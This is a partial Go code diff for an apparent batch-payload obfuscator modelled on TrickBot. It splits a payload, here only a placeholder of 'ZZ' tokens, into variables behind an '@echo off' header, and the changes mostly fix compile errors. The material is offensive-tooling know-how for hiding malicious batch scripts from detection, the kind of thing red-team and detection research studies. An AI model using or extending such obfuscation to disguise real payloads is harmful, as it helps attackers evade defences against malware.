@@ -21,7 +21,7 @@ type Payload struct {
 	trickbotEquals          string
 }
 
-func check(e error) {
+func checkError(e error) {
 	if e != nil {
 		panic(e)
 	}
@@ -31,13 +31,13 @@ func (p *Payload) ExportPayload(filepath string) error {
 	f, err := os.Create(filepath)
 	checkError(err)
 	defer f.Close()
-	_, errWriteBatchHeader := f.WriteString(p.batchHeader)
+	_, err = f.WriteString(p.batchHeader)
 	checkError(err)
-	_, errWriteTrickBotHeader := f.WriteString(p.trickbotHeader)
+	_, err = f.WriteString(p.trickbotHeader)
 	checkError(err)
-	_, errWriteTransPayloadList := f.WriteString(p.translatePayloadListing)
+	_, err = f.WriteString(p.translatePayloadListing)
 	checkError(err)
-	_, errWriteObfusPayload := f.WriteString(p.obfuscatedPayload)
+	_, err = f.WriteString(p.obfuscatedPayload)
 	checkError(err)
 	fmt.Println("Payload successfully written to %s", filepath)
 	return nil
@@ -50,8 +50,6 @@ func initStrArray(n int) []string {
 	}
 	return result
 }
-
-
 
 func (p *Payload) AssignDefaults() {
 	p.batchHeader = "@echo off\n"
@@ -106,7 +104,7 @@ func (p *Payload) WriteObfuscatedPayload(trickbotPayloadVariables []string, vari
 }
 
 func main() {
-	builder := strings.Builder{}
+	//builder := strings.Builder{}
 	payload := Payload{}
 	//outputFileName := "test"
 	payload.AssignDefaults()
@@ -119,9 +117,9 @@ func main() {
 	//rawFileOutput, err := os.ReadFile("/tmp/dat")
 	//check(err)
 	//Deal with the "@echo off"
-	rawFileOutput := "@echo of ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ"
-	splitHeaderAndPayload := strings.SplitN(rawFileOutputlPayload, "@echo off", 1)
-	veilPayload = splitHeaderAndPayload[1]
+	rawFileOutput := "@echo off\nZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ ZZ"
+	splitHeaderAndPayload := strings.SplitN(rawFileOutput, "\n", 2)
+	veilPayload := splitHeaderAndPayload[1]
 	splitPayload := strings.SplitN(veilPayload, " ", -1)
 
 	// Create Variable array to hold generate variable names
@@ -133,7 +131,7 @@ func main() {
 	payload.ConcatVarWithPayloadParts(trickbotPayloadVariables, splitPayload, variableNameAmount)
 
 	// Write out the obfuscatedPayload payload eplacing payload with "variablized" whitespace
-	p.WriteObfuscatedPayload(trickbotPayloadVariables, variableNameAmount)
+	payload.WriteObfuscatedPayload(trickbotPayloadVariables, variableNameAmount)
 
 	//Export payload to file
 	//payload.ExportPayload()
@@ -144,3 +142,4 @@ func main() {
 	fmt.Println(payload.obfuscatedPayload)
 
 }
+
